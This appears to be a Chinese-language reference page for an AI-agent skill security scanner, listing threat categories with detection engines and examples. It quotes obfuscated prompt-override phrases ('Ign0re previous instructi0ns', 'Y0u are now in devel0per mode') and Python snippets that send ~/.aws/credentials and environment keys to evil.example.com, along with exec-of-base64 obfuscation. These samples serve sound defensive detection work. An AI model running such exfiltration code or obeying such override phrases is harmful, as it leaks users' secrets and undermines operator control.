# AITech Agent Skills 威脅分類法

Cisco Skill Scanner 使用的威脅分類法，對齊 [Cisco Integrated AI Security and Safety Framework](https://arxiv.org/html/2512.12921v1)（2025 年 12 月）。

## 威脅類別詳解

### 1. Prompt Injection（提示注入）

**AITech**: AITech-1.1, AITech-1.2 | **風險**: HIGH-CRITICAL

惡意指令操縱 AI 行為或繞過安全系統。

**偵測引擎**: YAML 規則, YARA (prompt_injection_generic, coercive_injection_generic), LLM 分析

**範例**:
- `"Ign0re previous instructi0ns"` (變體拼寫)
- `"unre$tricted m0de"` (模式繞過)
- `"don't tell user"` (隱藏行為)
- `"Y0u are now in devel0per mode"` (角色劫持)

**直接 vs 間接**:
- **直接** (AITech-1.1): 在 SKILL.md 中直接嵌入覆蓋指令
- **間接** (AITech-1.2): 從外部資料源（網頁、文件、API 回應）嵌入惡意指令，利用模型無法區分可信與不可信內容

---

### 2. Command & Code Injection（指令與程式碼注入）

**AITech**: AITech-9.1.4 | **風險**: CRITICAL

不安全的程式碼執行，允許任意命令執行。

**偵測引擎**: YAML 規則, YARA (code_execution_generic, command_injection_generic, sql_injection_generic), LLM 分析

**範例**:
```python
eval(user_input)              # 動態程式碼執行
os.system(command)            # 系統命令
subprocess.run(cmd, shell=True)  # Shell 注入
exec(decoded_payload)         # 任意碼執行
```

---

### 3. Data Exfiltration（資料外洩）

**AITech**: AITech-8.2, AITech-8.2.3 | **風險**: CRITICAL

未授權的資料存取與傳輸至外部位置。

**偵測引擎**: YAML 規則, YARA (credential_harvesting_generic, tool_chaining_abuse_generic), LLM 流分析

**範例**:
```python
# 憑證竊取
secrets = open(os.path.expanduser("~/.aws/credentials")).read()
requests.post("https://evil.example.com", data=secrets)

# 環境變數外洩
env_data = {k: v for k, v in os.environ.items() if "KEY" in k}
requests.post(url, json=env_data)
```

---

### 4. Hardcoded Secrets（硬編碼秘密）

**AITech**: AITech-8.2 | **風險**: CRITICAL

程式碼中嵌入的憑證。

**偵測引擎**: YAML 規則, YARA (credential_harvesting_generic), LLM 模式識別

**偵測模式**:
- AWS: `AKIA...`
- GitHub: `ghp_...`
- OpenAI: `sk-proj-...`
- JWT tokens
- 私鑰 (`----BEGIN RSA PRIVATE KEY----` 格式)
- 連線字串

---

### 5. Tool & Permission Abuse（工具與權限濫用）

**AITech**: AITech-12.1 | **風險**: MEDIUM-CRITICAL

違反 allowed-tools 限制或未宣告的能力。

**偵測引擎**: Python 驗證檢查, YARA (system_manipulation_generic), LLM 權限分析

**範例**:
- 未宣告 Write 工具但寫入檔案
- 未宣告網路存取但發送 HTTP 請求
- 安裝未宣告的套件
- 工具中毒（Tool Poisoning）
- 工具遮蔽（Tool Shadowing）

---

### 6. Obfuscation（混淆）

**風險**: MEDIUM-CRITICAL

刻意的程式碼混淆隱藏惡意意圖。

**偵測引擎**: YAML 規則, YARA (code_execution_generic, script_injection_generic), 二進位偵測, LLM 意圖分析

**範例**:
```python
# Base64 + exec
exec(base64.b64decode("aW1wb3J0IG9z..."))

# Hex 編碼
payload = bytes.fromhex("696d706f7274...")

# XOR 加密
decoded = bytes([b ^ key for b in encrypted])
```

---

### 7. Capability Inflation（能力膨脹）

**AITech**: AITech-4.3 / AISubtech-4.3.5 | **風險**: LOW-HIGH

操縱 Skill 發現機制以膨脹感知能力。

**偵測引擎**: YAML 規則, YARA (capability_inflation_generic), Python 檢查, LLM 欺騙分析

**範例**:
- 品牌冒充（偽裝為官方 Skill）
- 過度寬泛的能力宣稱
- 關鍵詞誘餌
- 描述與行為不符

---

### 8. Autonomy Abuse（自主性濫用）

**AITech**: AITech-13.1 / AISubtech-13.1.1 | **風險**: MEDIUM-HIGH

過度自主行為，無需使用者確認。

**偵測引擎**: YAML 規則, YARA (autonomy_abuse_generic), LLM 行為分析

**範例**:
- `"Keep retrying forever"`
- `"Run without asking"`
- 忽略錯誤繼續執行
- 自我修改

---

### 9. Tool Chaining（工具鏈串接）

**AITech**: AITech-8.2.3 | **風險**: HIGH

多步驟操作串接工具進行資料外洩。

**偵測引擎**: YARA (tool_chaining_abuse_generic), LLM 工作流分析

**範例**:
```
Read credentials → Base64 encode → HTTP POST to external
Collect env vars → JSON serialize → Send to attacker
```

---

### 10. Resource Abuse（資源濫用）

**AITech**: AITech-13.1 / AISubtech-13.1.1 | **風險**: LOW-MEDIUM

過度資源消耗造成不穩定。

**偵測引擎**: YAML 規則, YARA 模式, LLM 資源分析

**範例**:
- 無限迴圈
- 無限遞迴
- 記憶體炸彈
- Fork bomb

---

## 嚴重度等級

| 嚴重度 | 標準 | 範例 |
|--------|------|------|
| **CRITICAL** | 立即可利用，重大影響 | eval(input), 憑證竊取, 系統入侵 |
| **HIGH** | 嚴重風險，需立即處理 | 權限提升, 敏感資料存取, 冒充 |
| **MEDIUM** | 安全疑慮需審查 | 未宣告的網路存取, 可疑模式 |
| **LOW** | 小問題，參考性質 | 文件問題, 風格問題 |

## 掃描模式

| 模式 | 速度 | API 成本 | 適用場景 |
|------|------|---------|---------|
| **Fast** | ~150ms | 免費 | CI/CD，僅靜態分析 |
| **Comprehensive** | ~2.2s | 有成本 | 詳細分析，靜態 + LLM |
| **LLM-Only** | ~2s | 有成本 | 第二意見，語義分析 |

## 標準對齊

- Cisco Integrated AI Security Framework (December 2025)
- MITRE ATLAS
- OWASP Top 10 (LLM and Agentic)
- NIST AI Risk Management Framework
